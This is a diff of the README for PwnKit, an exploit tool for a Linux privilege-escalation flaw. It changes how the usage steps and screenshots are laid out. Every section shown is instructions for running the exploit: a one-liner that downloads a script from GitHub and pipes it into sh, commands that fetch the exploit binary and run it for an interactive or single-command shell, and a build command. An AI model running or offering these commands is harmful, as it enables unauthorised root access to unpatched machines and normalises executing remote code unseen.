@@ -10,30 +10,30 @@ Should work out of the box on vulnerable Linux distributions based on Ubuntu, De
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
 
-### Manual
+![](./imgs/oneliner.png)
+
+### Manually
 
 ```bash
-wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
 chmod +x ./PwnKit
 ./PwnKit # interactive shell
 ./PwnKit 'id' # single command
 ```
+
+![](./imgs/exploit.png)
+
+### Patched
+
+Running the exploit against patched versions will yield the following output.
+
+![](./imgs/patched.png)
 
 ### Build
 
 ```bash
 gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 ```
-
-## Example
-
-### Vulnerable
-
-![](./imgs/exploit.png)
-
-### Patched
-
-![](./imgs/patched.png)
 
 ## Technical Details
 
